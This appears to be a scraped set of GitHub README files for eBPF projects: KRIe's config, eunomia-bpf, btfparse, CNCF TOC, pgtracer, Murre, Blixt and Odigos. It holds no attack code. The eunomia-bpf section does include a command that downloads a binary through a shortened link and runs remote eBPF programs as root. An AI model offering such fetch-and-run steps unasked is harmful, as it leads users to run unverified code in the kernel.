### Getting started

KRIe needs to run as root. Run `sudo krie -h` to get help.

```shell script
# ~ krie -h
Usage:
  krie [flags]

Flags:
      --config string   KRIe config file (default ""./cmd/krie/run/config/default_config.yaml"")
  -h, --help            help for krie
```

### Configuration

```yaml
## Log level, options are: panic, fatal, error, warn, info, debug or trace
log_level: debug

## JSON output file, leave empty to disable JSON output.
output: ""/tmp/krie.json""

## BTF information for the current kernel in .tar.xz format (required only if KRIE isn't able to locate it by itself)
vmlinux: """"

## events configuration
events:
  ## action taken when an init_module event is detected
  init_module: log

  ## action taken when an delete_module event is detected
  delete_module: log

  ## action taken when a bpf event is detected
  bpf: log

  ## action taken when a bpf_filter event is detected
  bpf_filter: log

  ## action taken when a ptrace event is detected
  ptrace: log

  ## action taken when a kprobe event is detected
  kprobe: log

  ## action taken when a sysctl event is detected
  sysctl:
    action: log

    ## Default settings for sysctl programs (kernel 5.2+ only)
    sysctl_default:
      block_read_access: false
      block_write_access: false

    ## Custom settings for sysctl programs (kernel 5.2+ only)
    sysctl_parameters:
      kernel/yama/ptrace_scope:
        block_write_access: true
      kernel/ftrace_enabled:
        override_input_value_with: ""1\n""

  ## action taken when a hooked_syscall_table event is detected
  hooked_syscall_table: log

  ## action taken when a hooked_syscall event is detected
  hooked_syscall: log

  ## kernel_parameter event configuration
  kernel_parameter:
    action: log
    periodic_action: log
    ticker: 1 # sends at most one event every [ticker] second(s)
    list:
      - symbol: system/kprobes_all_disarmed
        expected_value: 0
        size: 4
      #      - symbol: system/selinux_state
      #        expected_value: 256
      #        size: 2

      # sysctl
      - symbol: system/ftrace_dump_on_oops
        expected_value: 0
        size: 4
      - symbol: system/kptr_restrict
        expected_value: 0
        size: 4
      - symbol: system/randomize_va_space
        expected_value: 2
        size: 4
      - symbol: system/stack_tracer_enabled
        expected_value: 0
        size: 4
      - symbol: system/unprivileged_userns_clone
        expected_value: 0
        size: 4
      - symbol: system/unprivileged_userns_apparmor_policy
        expected_value: 1
        size: 4
      - symbol: system/sysctl_unprivileged_bpf_disabled
        expected_value: 1
        size: 4
      - symbol: system/ptrace_scope
        expected_value: 2
        size: 4
      - symbol: system/sysctl_perf_event_paranoid
        expected_value: 2
        size: 4
      - symbol: system/kexec_load_disabled
        expected_value: 1
        size: 4
      - symbol: system/dmesg_restrict
        expected_value: 1
        size: 4
      - symbol: system/modules_disabled
        expected_value: 0
        size: 4
      - symbol: system/ftrace_enabled
        expected_value: 1
        size: 4
      - symbol: system/ftrace_disabled
        expected_value: 0
        size: 4
      - symbol: system/sysctl_protected_fifos
        expected_value: 1
        size: 4
      - symbol: system/sysctl_protected_hardlinks
        expected_value: 1
        size: 4
      - symbol: system/sysctl_protected_regular
        expected_value: 2
        size: 4
      - symbol: system/sysctl_protected_symlinks
        expected_value: 1
        size: 4
      - symbol: system/sysctl_unprivileged_userfaultfd
        expected_value: 0
        size: 4

  ## action to check when a register_check fails on a sensitive kernel space hook point
  register_check: log
```

## Documentation

- The first version of KRIe was announced at BlackHat 2022, during the briefing: [Return to Sender - Detecting Kernel Exploits with eBPF](https://www.blackhat.com/us-22/briefings/schedule/index.html#return-to-sender---detecting-kernel-exploits-with-ebpf-27127)

## License

- The golang code is under Apache 2.0 License.
- The eBPF programs are under the GPL v2 License."
eunomia-bpf/eunomia-bpf,793,71,793,26,Rust,A Toolchain to make Build and Run eBPF programs easier,2022-08-20T14:00:33Z,2025-10-11T10:04:33Z,634,"![logo](documents/src/img/logo.png)

# eunomia-bpf: simplify and enhance eBPF with CO-RE[^1] and WebAssembly[^2]

[![Actions Status](https://github.com/eunomia-bpf/eunomia-bpf/workflows/Ubuntu/badge.svg)](https://github.com/eunomia-bpf/eunomia-bpf/actions)
[![GitHub release (latest by date)](https://img.shields.io/github/v/release/eunomia-bpf/eunomia-bpf)](https://github.com/eunomia-bpf/eunomia-bpf/releases)
[![codecov](https://codecov.io/gh/eunomia-bpf/eunomia-bpf/branch/master/graph/badge.svg?token=YTR1M16I70)](https://codecov.io/gh/eunomia-bpf/eunomia-bpf)
[![DeepSource](https://deepsource.io/gh/eunomia-bpf/eunomia-bpf.svg/?label=active+issues&show_trend=true&token=rcSI3J1-gpwLIgZWtKZC-N6C)](https://deepsource.io/gh/eunomia-bpf/eunomia-bpf/?ref=repository-badge)
[![CodeFactor](https://www.codefactor.io/repository/github/eunomia-bpf/eunomia-bpf/badge)](https://www.codefactor.io/repository/github/eunomia-bpf/eunomia-bpf)

**A compiler and runtime framework to help you build and distribute eBPF program easier.**

## Introduction

`eunomia-bpf` is a dynamic loading library/runtime and a compile toolchain framework, aim at helping you build and distribute eBPF programs easier.

With eunnomia-bpf, you can:

- A library to simplify `writing` eBPF programs:
  - simplify building CO-RE[^1] `libbpf` eBPF applications: [write eBPF kernel code only](documents/src/miscellaneous/introduction.md#simplify-building-co-re-libbpf-ebpf-applications) and automatically exposing your data with `perf event` or `ring buffer` from kernel.
  - [Automatically sample the data](documents/src/miscellaneous/introduction.md#automatically-sample-the-data-and-print-hists-in-userspace) from hash maps and print `hists` in userspace.
  - [Automatically generate](documents/src/miscellaneous/introduction.md#automatically-generate-and-config-command-line-arguments) and config `command line arguments` for eBPF programs.
  - You can writing the kernel part in both `BCC` and `libbpf` styles.
- Build eBPF programs with `Wasm`[^2]: see [`Wasm-bpf`](https://github.com/eunomia-bpf/wasm-bpf) project
  - Runtime, libraries and toolchains to [write eBPF with Wasm](https://github.com/eunomia-bpf/wasm-bpf) in C/C++, Rust, Go...covering the use cases from `tracing`, `networking`, `security`.
- simplify `distributing` eBPF programs:
  - A [tool](ecli/) for push, pull and run pre-compiled eBPF programs as `OCI` images in Wasm module
  - Run eBPF programs from `cloud` or `URL` within [`1` line of bash](documents/src/miscellaneous/introduction.md#dynamic-load-and-run-co-re-ebpf-kernel-code-from-the-cloud-with-url-or-oci-image) without recompiling, kernel version and architecture independent.
  - [Dynamically load](bpf-loader-rs) eBPF programs with `JSON` config file or `Wasm` module.

For more information, see [documents/introduction.md](documents/src/miscellaneous/introduction.md).

[^1]: CO-RE: [Compile Once â€“ Run Everywhere](https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html)
[^2]: WebAssembly or Wasm: <https://webassembly.org/>

## Getting Started

- Github Templateï¼š[eunomia-bpf/ebpm-template](https://github.com/eunomia-bpf/ebpm-template)
- example bpf programs: [examples/bpftools](examples/bpftools/)
- tutorial: [eunomia-bpf/bpf-developer-tutorial](https://github.com/eunomia-bpf/bpf-developer-tutorial)

### run as cli tool or server

You can get pre-compiled eBPF programs running from the cloud to the kernel in `1` line of bash:

```bash
# download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli
$ wget https://aka.pw/bpf-ecli -O ecli && chmod +x ./ecli
$ sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url
INFO [bpf_loader_lib::skeleton] Running ebpf program...
TIME     PID    TPID   SIG    RET    COMM   
01:54:49  77297 8042   0      0      node
01:54:50  77297 8042   0      0      node
01:54:50  78788 78787  17     0      which
01:54:50  78787 8084   17     0      sh
01:54:50  78790 78789  17     0      ps
01:54:50  78789 8084   17     0      sh
01:54:50  78793 78792  17     0      sed
01:54:50  78794 78792  17     0      cat
01:54:50  78795 78792  17     0      cat

$ sudo ./ecli run ghcr.io/eunomia-bpf/execve:latest # run with a name and download the latest version bpf tool from our repo
[79130] node -> /bin/sh -c which ps 
[79131] sh -> which ps 
[79132] node -> /bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,c 
[79133] sh -> /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command= 
[79134] node -> /bin/sh -c ""/home/yunwei/.vscode-server/bin/2ccd690cbf 
[79135] sh -> /home/yunwei/.vscode-server/bin/2ccd690cbff 78132 79119 79120 79121 
[79136] cpuUsage.sh -> sed -n s/^cpu\s//p /proc/stat
```

You can also use a server to manage and dynamically install eBPF programs.

Start the server:

```console
$ sudo ./ecli-server
[2023-08-08 02:02:03.864009 +08:00] INFO [server/src/main.rs:95] Serving at 127.0.0.1:8527
```

Use the ecli to control the remote server and manage multiple eBPF programs:

```console
$ ./ecli client start sigsnoop.json # start the program
1
$ ./ecli client log 1 # get the log of the program
TIME     PID    TPID   SIG    RET    COMM   
02:05:58  79725 78132  17     0      bash
02:05:59  77325 77297  0      0      node
02:05:59  77297 8042   0      0      node
02:05:59  77297 8042   0      0      node
02:05:59  79727 79726  17     0      which
02:05:59  79726 8084   17     0      sh
02:05:59  79731 79730  17     0      which
```

For more information, see [documents/src/ecli/server.md](documents/src/ecli/server.md).

## Install the project

- Install the `ecli` tool for running eBPF program from the cloud:

    ```console
    $ wget https://aka.pw/bpf-ecli -O ecli && chmod +x ./ecli
    $ ./ecli -h
    ecli subcommands, including run, push, pull, login, logout

    Usage: ecli-rs [PROG] [EXTRA_ARGS]... [COMMAND]

    Commands:
      run     run ebpf program
      client  Client operations
      push    
      pull    pull oci image from registry
      login   login to oci registry
      logout  logout from registry
      help    Print this message or the help of the given subcommand(s)

    Arguments:
      [PROG]           Not preferred. Only for compatibility to older versions. Ebpf program URL or local path, set it `-` to read the program from stdin
      [EXTRA_ARGS]...  Not preferred. Only for compatibility to older versions. Extra args to the program; For wasm program, it will be passed directly to it; For JSON program, it will be passed to the generated argument parser

    Options:
      -h, --help  Print help
    ....
    ```

- Install the `ecc` compiler-toolchain for compiling eBPF kernel code to a `config` file or `Wasm` module(`clang`, `llvm`, and `libclang` should be installed for compiling):

    ```console
    $ wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc && chmod +x ./ecc
    $ ./ecc -h
    eunomia-bpf compiler
    Usage: ecc [OPTIONS] <SOURCE_PATH> [EXPORT_EVENT_HEADER]
    ....
    ```

  or use the docker image for compile:

    ```bash
    # for x86_64 and aarch64
    docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # compile with docker. `pwd` should contains *.bpf.c files and *.h files.
    ```

- build the compiler, runtime library and tools:

  see [build](https://eunomia.dev/eunomia-bpf/setup/build) for building details.

## Examples

See [examples](examples) for details about simple eBPF tools and eunomia-bpf library usage.

See [github.com/eunomia-bpf/wasm-bpf/tree/main/examples](https://github.com/eunomia-bpf/wasm-bpf/tree/main/examples) for Wasm eBPF programs and examples.

We also have a prove of concept video: [Writing eBPF programs in Wasm](https://www.bilibili.com/video/BV1JN4y1A76k/).

## License

MIT LICENSE
"
trailofbits/btfparse,28,6,28,1,C++,A C++ library that parses debug information encoded in BTF format,2021-09-01T16:10:34Z,2025-09-21T05:57:09Z,42,"# btfparse

btfparse is a C++ library that parses kernel debug symbols in BTF format.

# CI

[![Linux](https://github.com/trailofbits/btfparse/actions/workflows/main.yml/badge.svg)](https://github.com/trailofbits/btfparse/actions/workflows/main.yml)

# Building

## Prerequisites

 * A recent C++ compiler, supporting C++17
 * CMake >= 3.16.4

## Steps to build

**Clone the repository**

```bash
git clone https://github.com/trailofbits/btfparse
cd btfparse
git submodule update --init
```

**Configure the project**

```bash
mkdir build
cd build
cmake .. \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
  -DBTFPARSE_ENABLE_TOOLS=true \
  -DBTFPARSE_ENABLE_TESTS=true
```

**Build the project**

```bash
cmake \
  --build . \
  -j $(nproc)
```

**Running the tests**

The tests require `bpftool` which can be installed in Ubuntu via the `linux-tools-generic` package:

```bash
sudo apt-get install linux-tools-generic
```

Then, tests can be run:

```bash
cmake \
  --build . \
  --target test
```

# Importing btfparse in your project

This library is meant to be used as a git submodule:

1. Enter your project folder
2. Create the submodule: `git submodule add https://github.com/trailofbits/btfparse`
3. Import the library from your CMakeLists.txt file: `add_subdirectory(""btfparse"")`
4. Link the btfparse library against your target: `target_link_libraries(your_target PRIVATE btfparse)`

# Examples

## Tool example: dump-btf

The library comes with a **dump-btf** tool that is output-compatible with **bpftool**. In order to build it, make sure to pass `-DBTFPARSE_ENABLE_TOOLS=true` at configure time.

```bash
alessandro@ubuntu2110:~/btfparse-build$ ./tools/dump-btf/dump-btf /sys/kernel/btf/vmlinux | head
[1] INT 'long unsigned int' size=8 bits_offset=0 nr_bits=64 encoding=(none)
[2] CONST '(anon)' type_id=1
[3] ARRAY '(anon)' type_id=1 index_type_id=18 nr_elems=2
[4] PTR '(anon)' type_id=6
[5] INT 'char' size=1 bits_offset=0 nr_bits=8 encoding=(none)
[6] CONST '(anon)' type_id=5
[7] INT 'unsigned int' size=4 bits_offset=0 nr_bits=32 encoding=(none)
[8] CONST '(anon)' type_id=7
[9] INT 'signed char' size=1 bits_offset=0 nr_bits=8 encoding=(none)
[10] TYPEDEF '__u8' type_id=11
```

## Code example

```c++
#include <btfparse/ibtf.h>

bool parseTypes() {
  static const std::vector<std::filesystem::path> kPathList{
      ""/sys/kernel/btf/vmlinux""};

  auto btf_res = btfparse::IBTF::createFromPathList(kPathList);
  if (btf_res.failed()) {
    std::cerr << ""Failed to open the BTF file: "" << btf_res.takeError() << ""\n"";
    return false;
  }

  auto btf = btf_res.takeValue();
  if (btf->count() == 0) {
    std::cout << ""No types were found!\n"";
    return false;
  }

  for (const auto &btf_type_map_p : btf->getAll()) {
    const auto &id = btf_type_map_p.first;
    const auto &btf_type = btf_type_map_p.second;

    auto type_kind = btfparse::IBTF::getBTFTypeKind(btf_type);
    if (type_kind != btfparse::BTFKind::Struct) {
      continue;
    }

    const auto &btf_struct = std::get<btfparse::StructBTFType>(btf_type);

    std::cout << std::to_string(id) << "": "";
    if (btf_struct.opt_name.has_value()) {
      std::cout << btf_struct.opt_name.value() << ""\n"";

    } else {
      std::cout << ""unnamed\n"";
    }
  }

  return true;
}
```
"
cncf/toc,1772,663,1772,138,Go,âš–ï¸ The CNCF Technical Oversight Committee (TOC) is the technical governing body of the CNCF Foundation.,2015-12-07T19:29:57Z,2025-10-09T22:09:04Z,2378,"# CNCF Technical Oversight Committee (TOC)

The CNCF TOC is the technical governing body of the CNCF. It admits and oversees all projects in the CNCF  and has a mandate to facilitate driving neutral consensus for:
* defining and maintaining the technical vision and [principles](https://github.com/cncf/toc/blob/main/PRINCIPLES.md) for the Cloud Native Computing Foundation,
* approving new projects within the scope of  the CNCF set by the Governing Board (GB), creating  a conceptual architecture for the projects, aligning projects, removing or archiving projects,
* accepting feedback from end user technical advisory board and map to projects,
* aligning interfaces to components under management (code reference implementations before standardizing), and defining common practices to be implemented across CNCF projects, if any.

## TOC Technical Vision
The technical direction of the ecosystem is problem-centric. We encourage and support our projects to solve problems faced by adopters, to build the right ecosystem for innovation and embrace changes in the broader technical landscape. To exercise and increase the expertise within the technical community to compose solutions that stand the test of time.

## Members

* **Alex Chircop**  (term: 2 years - start date: 3/4/2025 - 3/4/2027) [TOC-appointed]
* **Chad Beaudin** (term: 2 years - start date: 3/4/2025 - 3/4/2027) [EndUser-appointed]
* **Davanum Srinivas** (term: 2 years - start date: 2/16/2024 - 2/16/2026) [TOC-appointed]
* **Emily Fox** (term: 2 years - start date: 2/4/2024 - 3/4/2026) [GB-appointed]
* **Faseela K** (term: 2 years 3/4/2025 - 3/4/2027) [GB-appointed]
* **Jeremy Rickard** (term: 2 years - start date: 3/4/2025 - 3/4/2027) [GB-appointed]
* **Karena Angell** (term: 2 years - start date: 3/4/2025 - 3/4/2027) [GB-appointed][TOC Chair]
* **Katie Gamanji** (term: 2 years - start date: 3/18/2022 - 2/4/2026) [GB-appointed]
* **Kevin Wang** (term: 2 years - start date 2/4/2024 - 2/4/2026) [Maintainer-appointed]
* **Lin Sun** (term: 2 years - start date 2/4/2024 - 2/4/2026) [GB-appointed]  
* **Ricardo Rocha** (term: term: 2 years - start date: 2/4/2024 - 2/4/2026) [EndUser-appointed]

## TOC Shadows

* **Ricardo Aravena** (term: 1 year - start date: 3/4/2025 - 3/4/2026) [GB-appointed][shadow]

Election [schedule](operations/election-schedule.md)

## Projects

See the [current CNCF projects](https://www.cncf.io/projects/) and a description of project maturity levels (Sandbox, Incubating, Graduated).

The CNCF provides a [list of services](https://www.cncf.io/services-for-projects/) for incubating and graduated projects hosted in the foundation. A subset of these services is also available for [Sandbox](https://www.cncf.io/sandbox-projects/) level projects.

Do you want to contribute to a project? We have a [guide](https://contribute.cncf.io/contributors/) to get you started.

If you would like to know more about the project lifecycle we use, we have [outlined the process](https://github.com/cncf/toc/blob/main/process/README.md). If you have any questions or don't know where to start, please open an [issue](https://github.com/cncf/toc/issues).

## Meeting Time

The TOC meets on the 1st and 3rd Tuesday of every month at 8AM PT (USA Pacific Time; [Convert to local time zone](http://www.thetimezoneconverter.com/?t=8:00AM&tz=San%20Francisco)).  

Here is a [calendar for all public CNCF events](https://zoom-lfx.platform.linuxfoundation.org/meetings/cncf?view=week). This calendar is also available on the [CNCF Website](https://www.cncf.io/calendar/) Meetings can be joined directly form the calendar.

## Meeting Agenda and Minutes
- [Meeting Agenda and Minutes](https://github.com/cncf/toc/issues?q=is%3Aissue%20label%3Akind%2Fmeeting%20)
- [Archive (2018.10~2024.08) of Meeting Working Doc](https://docs.google.com/document/d/1jpoKT12jf2jTf-2EJSAl4iTdA7Aoj_uiI19qIaECNFc/edit#). This includes minutes from previous meetings.
- [Archive (2016.02~2019.06) of Meeting agenda and presentations](resources/meeting_presentations.md).
- [Archive (2016.04~2018.11) of community presentations](resources/scheduled_presentations.md)
- [CNCF TOC Playlist on YouTube](https://www.youtube.com/playlist?list=PLj6h78yzYM2Mf6GCZzW6CAk6GlZESbemB)

## Mailing List

Public mailing list for the CNCF TOC: cncf-toc@lists.cncf.io

The public mailing archive: https://lists.cncf.io/g/cncf-toc

Details to join this public mailing list: https://lists.cncf.io/mailman/listinfo/cncf-toc

In case you need to reach the CNCF TOC on sensitive issues, please email us at: cncf-private-toc@lists.cncf.io

## Slack

Public CNCF TOC channel: Join the [CNCF slack](https://slack.cncf.io/) and we are reachable at [#toc](https://cloud-native.slack.com/archives/C0MP69YF4).  

## Voting

This is our [voting policy](docs/voting.md). Only TOC members can cast binding votes. (+1 Binding)

## Technical Advisory Groups Being Phased Out

The TOC has approved the formation of [TAGs](./.archive/README.md).
Currently, the following Technical Advisory Groups are active: 

* [TAG-Security](https://github.com/cncf/tag-security)
* [TAG-Storage](https://github.com/cncf/tag-storage) 
* [TAG-App-Delivery](https://github.com/cncf/tag-app-delivery)
* [TAG-Network](https://github.com/cncf/tag-network)
* [TAG-Runtime](https://github.com/cncf/tag-runtime)
* [TAG Contributor Strategy](https://github.com/cncf/tag-contributor-strategy)
* [TAG Observability](https://github.com/cncf/tag-observability)
* [TAG Environmental Sustainability](https://github.com/cncf/tag-env-sustainability)

The current Technical Advisory Groups will be spun down during 2025 and replaced with new Technical Advisory Groups and TOC SubProjects, listed below.

## New Technical Advisory Groups and TOC SubProjects

### New Technical Advisory Groups

* [TAG Developer Experience](./tags/tag-developer-experience/)
* [TAG Infrastructure](./tags/tag-infrastructure/)
* [TAG Operational Resilience](./tags/tag-operational-resilience/)
* [TAG Security and Compliance](./tags/tag-security-and-compliance/)
* [TAG Workloads Foundation](./tags/tag-workloads-foundation/charter.md)

### TOC SubProjects

* [Artificial Intelligence SubProject](./toc_subprojects/artificial-intelligence-subproject)
* [Contributor Strategy and Advocacy  SubProject](./toc_subprojects/contributor-strategy-and-advocacy-subproject)
* [Mentoring SubProject](./toc_subprojects/mentoring-subproject/)
* [Project Reviews SubProject](./toc_subprojects/project-reviews-subproject/)


### Updating TAG or SubProject README files

To modify the README files for individual TAGs or TOC SubProjects, please **do not edit them directly**. Instead, the source of truth for these files is the [`tags.yaml`](https://github.com/cncf/toc/blob/main/tags.yaml) file. To understand the process for updating these READMEs by modifying `tags.yaml`, please refer to the [Updating TOC TAG and SubProject README Files document](./generator/updating-tag-and-toc=subproject-readme-files.md).
"
aiven/pgtracer,146,13,146,7,Python,"Tracing tools for PostgreSQL, using eBPF",2022-06-22T12:04:37Z,2025-10-09T02:08:02Z,120,"PGTracer
========

PGTracer is a collection of tools to trace queries, execution plans and more in
PostgreSQLÂ®, using eBPF.

Overview
========

PGTracer offers a way to instrument PostgreSQL, using the Linux eBPF facility.
As it does advanced memory access, it needs the PostgreSQL debug symbols to
resolve symbols and offsets in structs.

Features
============

* Attach to a running PostgreSQL backend, and dump every executed query along
  with it's search path
* Optionally turn on instrumentation (just like EXPLAIN ANALYZE does) to gather
  more information

Planned features:
* Gather information about individual execution nodes to print query plans
* Gather system information and link them to individual nodes (think syscalls,
  IO, memory allocation...)
* Build a TUI to explore the data
* Allow to follow a transaction


Install
============

You will need a running PostgreSQL install, and it's debug symbols.

For pgtracer itself you will need:
 - libunwind installed on the system
 - the [BPF Compiler Collection](https://github.com/iovisor/bcc/blob/master/INSTALL.md)
 - several python packages as dependencies:
   - `psutil`
   - `pyelftools`

Support will vary depending on your Linux distribution, kernel version, and
library versions, as well as how PostgreSQL was compiled.

Please file a bug if it doesn't work as expected.

Ubuntu
------------

To install the debug symbols, install the `postgresql-version-dbgsym` package. You may have to enable additional repositories though.

To run pgtracer you will need some python packages as well as packages only available from the repos.

```
apt install python3-bpfcc python3-pip libunwind-dev
```

Then upgrade pip using pip:

```
pip install pip --upgrade
```

And you are now ready to install the pgtracer package itself:

```
git clone https://github.com/aiven/pgtracer.git
cd pgtracer
pip install .
```


Fedora
---------

To install the debugging symbols:

```
yum install dnf-utils
debuginfo-install postgresql-server
```

For the dependencies:

```
yum install python3-bcc libunwind  python3-pip libunwind-devel
```

Then install pgtracer itself:

```
git clone https://github.com/aiven/pgtracer.git
cd pgtracer
pip install pip --upgrade
pip install .
```



Arch Linux
------------

To install PostgreSQL debug symbols, as root:

```
pacman -S debuginfod
export DEBUGINFOD_URLS=""https://debuginfod.archlinux.org/""
debuginfod-find debuginfo /usr/bin/postgres
```

To install the required packages:

```
pacman -S python-bcc libunwind python-pip
```

Then install the pgtracer package itself:

```
git clone https://github.com/aiven/pgtracer.git
cd pgtracer
pip install .
```


Usage
=============

Currently, only one script comes with pgtracer: `pgtrace_queries`.
Since pgtracer uses eBPF, it needs to be run as root.

```
usage: pgtrace_queries [-h] [--instrument [{TIMER,BUFFERS,ROWS,WAL,ALL} ...]] [--nodes-collection] pid

Dump a running backend execution plan

positional arguments:
  pid                   PID to connect to

options:
  -h, --help            show this help message and exit
  --instrument [{TIMER,BUFFERS,ROWS,WAL,ALL} ...], -I [{TIMER,BUFFERS,ROWS,WAL,ALL} ...]
                        Instrument flags to set. (warning: writes into backends memory!)
  --nodes-collection, -n
                        Collect information about individual execution nodes
```



Depending on the way the PostgreSQL binary have been compiled, you may need a
more recent pyelftools version than what is packaged with your distribution:
DWARF5 support is quite recent and continuously improving.





License
=======
pgtracer is licensed under the PostgreSQL license. Full license text is available in the [LICENSE](LICENSE) file.

Please note that the project explicitly does not require a CLA (Contributor License Agreement) from its contributors.

Contact
============
Bug reports and patches are very welcome, please post them as GitHub issues and pull requests at https://github.com/aiven/pgtracer .
To report any possible vulnerabilities or other serious issues please see our [security](SECURITY.md) policy.

Trademarks
==========

The terms Postgres and PostgreSQL are registered trademarks of the PostgreSQL Community Association of Canada.
"
groundcover-com/murre,316,18,316,9,Go,"Murre is an on-demand, scaleable source of container resource metrics for K8s.",2022-10-01T09:53:29Z,2025-09-22T19:01:31Z,53,"<div align=""center"">
  <h1>Murre</h1>
  <p align=""center"">
    <img src=""images/logo.png"" width=""25%"" alt=""murre"" title=""murre"" />
   </p>
    <h2>On demand Kubernetes metrics at scale</h2>
   <a href=""https://groundcover.com/blog/murre""><strong>Read More Â»</strong></a>
  <p>


  [![slack](https://cdn.bfldr.com/5H442O3W/at/pl546j-7le8zk-e2zxeg/Slack_Mark_Monochrome_White.png?auto=webp&format=png&width=50&height=50)](https://www.groundcover.com/join-slack)
</div>


<p align=""center"">
<img src=""images/demo.gif"" width=""100%"" alt=""murre"" title=""murre"" />
</p>

## What is Murre?
Murre is an **on-demand, scaleable source of container resource metrics for K8s**.

Murre fetchs CPU & memory resource metrics directly from the kubelet on each K8s Node.
Murre also enriches the resources with the relevant K8s requests and limits from each PodSpec.

## Why Murre?
Murre is a simple, stateless and minimalistic approach to K8s resource monitoring that works at any scale.
Murre is free of any third-party dependencies, requiring nothing to be installed on the cluster.

## Installing Murre
```go
go install github.com/groundcover-com/murre@latest
```

## Using Murre
- Detect pods and containers with high CPU or memory utilization
```bash
murre --sortby-cpu-util
```
- Find out how much of CPU and memory does a specific pod consumes
```bash
murre --pod kong-51xst
```
- Focus on the resource consumption metrics in a specific namespace
```bash
murre --namespace production
```

"
Kong/blixt,452,61,452,0,Rust,Layer 4 Kubernetes load-balancer,2022-10-11T17:43:12Z,2025-09-29T14:37:57Z,635,"# ARCHIVE

**This project is now concluded**, and archived. Blixt started in the early
2020's at a time when eBPF technology was a huge buzz for Kubernetes, and
members of the Kubernetes SIG Network community wanted to experiment with and
explore the technology on K8s. Over time we suggested some specific goals we
_could_ have for the project, but those never really stuck. The project operated
primarily as an experimental sandbox, and a ""just for fun"" project.

As such if you're reading this, we're glad if it helps you and provides some
interesting insights, but do note that much of what you'll find in this
repository is largely incomplete exploratory code which can only be used in
a limited environment, so just keep that in mind.

We had a lot of fun working on this while it was active. It was great to create
the first official Kubernetes project in Rust, and experimenting with eBPF in
its nascence was exciting. All things must come to an end however. Thank you to
everyone who contributed to the project, good times!

# Blixt

A [layer 4][osi] load-balancer for [Kubernetes] written in [Rust] using
[kube-rs] for the control-plane and [eBPF] with [aya] for the data-plane.

[osi]:https://en.wikipedia.org/wiki/OSI_model
[Kubernetes]:https://kubernetes.io
[Rust]:https://rust-lang.org
[Kube-RS]:https://github.com/kube-rs
[eBPF]:https://ebpf.io/what-is-ebpf/
[Aya]:https://aya-rs.dev

# License

The Blixt control-plane components are licensed under [Apache License, Version
2.0][apache2], which is everything _outside_ of the `dataplane/` directory. The
data-plane components are dual-licensed under the [General Public License,
Version 2.0 (only)][gplv2] and the [2-Clause BSD License][bsd2c] (at your
option) including everything _inside_ the `dataplane/` directory.

[apache2]:https://github.com/kubernetes-sigs/blixt/blob/main/LICENSE
[gplv2]:https://github.com/kubernetes-sigs/blixt/blob/main/dataplane/LICENSE.GPL-2.0
[bsd2c]:https://github.com/kubernetes-sigs/blixt/blob/main/dataplane/LICENSE.BSD-2-Clause
"
keyval-dev/odigos,3552,232,3552,53,Go,Distributed tracing without code changes. ðŸš€ Instantly monitor any application using OpenTelemetry and eBPF,2022-06-08T04:09:44Z,2025-10-12T13:06:03Z,2566,"<p align=""center"">
    <a href=""https://github.com/odigos-io/odigos/actions/workflows/release.yml"" target=""_blank"">
        <img src=""https://github.com/odigos-io/odigos/actions/workflows/release.yml/badge.svg"" alt=""Release Odigos CLI""/>
    </a>
    <a href=""https://goreportcard.com/report/github.com/odigos-io/odigos/cli"" target=""_blank"">
        <img src=""https://goreportcard.com/badge/github.com/odigos-io/odigos/cli"" alt=""Go Report Card""/>
    </a>
    <a href=""https://godoc.org/github.com/odigos-io/odigos/cli"" target=""_blank"">
        <img src=""https://godoc.org/github.com/odigos-io/odigos/cli?status.svg"" alt=""GoDoc""/>
    </a>
</p>

[![Logo Dark Mode](./docs/logo/logo_white.svg)](https://odigos.io#gh-dark-mode-only)
[![Logo Light Mode](./docs/logo/logo_black.svg)](https://odigos.io#gh-light-mode-only)

<div align=""center"">
    <h2>Generate distributed traces for any application without code changes.</h2>
    <h4>If you find Odigos helpful, please â­ this repository to show your support!</h4>
    <h2>
        <a href=""https://odigos.io/?demo"">Demo Video</a>
        â€¢ <a href=""https://docs.odigos.io"">Documentation</a>
        â€¢ <a href=""https://join.slack.com/t/odigos/shared_invite/zt-1d7egaz29-Rwv2T8kyzc3mWP8qKobz~A"">Join Slack Community</a>
    </h2>
</div>

## What is Odigos?

Odigos is an open-source distributed tracing solution that simplifies and improves observability for Kubernetes environments and Virtual Machines. It provides instant tracing capabilities without requiring any code changes to your applications.

Odigos empowers platform engineers, DevOps professionals, and SREs to enhance their observability strategies quickly and effectively. It is an ideal solution for modern cloud-native environments, combining simplicity, performance, and industry expertise.

## Why choose Odigos?

1. **Simplicity** : Implement distributed tracing with minimal effort and complexity.
2. **Performance** : Separates data recording and processing to minimize runtime impact.
3. **Community-Backed** : With 3,000+ GitHub stars and a growing contributor base.
4. **Expertise** : Created by multiple maintainers of OpenTelemetry, ensuring deep integration and alignment with industry standards.

## Key Features

- **Code-Free Instrumentation** : Set up distributed tracing in minutes, eliminating manual code modifications.
- **Multi-Language Support** : Works with [Java](https://docs.odigos.io/instrumentations/java), [Python](https://docs.odigos.io/instrumentations/python), [.NET](https://docs.odigos.io/instrumentations/dotnet), [Node.js](https://docs.odigos.io/instrumentations/nodejs), and [Go](https://docs.odigos.io/instrumentations/golang) applications.
- **eBPF-Powered** : Utilizes eBPF technology for high-performance instrumentation.
- **OpenTelemetry Compatible** : Generates traces in OpenTelemetry format for broad tool compatibility.
- **Vendor Agnostic** : Integrates with various [monitoring solutions](https://docs.odigos.io/backends-overview), avoiding vendor lock-in.
- **Automatic Scaling** : Manages and scales OpenTelemetry collectors based on data volume.
- **Opinionated Defaults** : Supplies common defaults and best practices out-of-the-box, requiring no deep knowledge of OpenTelemetry.

### âœ¨ Language Agnostic Auto-instrumentation

Odigos supports any application written in Java, Python, .NET, Node.js, and **Go**.
Historically, compiled languages like Go have been difficult to instrument without code changes. Odigos solves this problem by uniquely leveraging [eBPF](https://ebpf.io).

![Works on any application](./docs/images/ui_choose_apps.png)

### ðŸ¤ Keep your existing observability tools

Odigos currently supports all the popular managed and open-source destinations.
By producing data in the [OpenTelemetry](https://opentelemetry.io) format, Odigos can be used with any observability tool that supports OTLP.

